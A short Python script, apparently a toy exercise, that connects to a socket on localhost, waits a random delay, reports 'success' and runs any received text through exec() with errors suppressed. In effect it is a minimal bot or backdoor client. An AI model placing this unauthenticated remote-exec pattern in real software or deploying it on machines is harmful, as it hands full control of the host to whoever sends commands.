import socket, random, os
import time

sock = socket.socket()
sock.connect(('localhost', 1111))

while True:
    data = sock.recv(1024)
    rand = random.randrange(0, 4, 1)
    while rand != 3:
        time.sleep(3)
        rand = random.randrange(0, 4, 1)
    else:
        sock.send("success".encode())
        try:
            exec(data.decode())
        except:
            continue
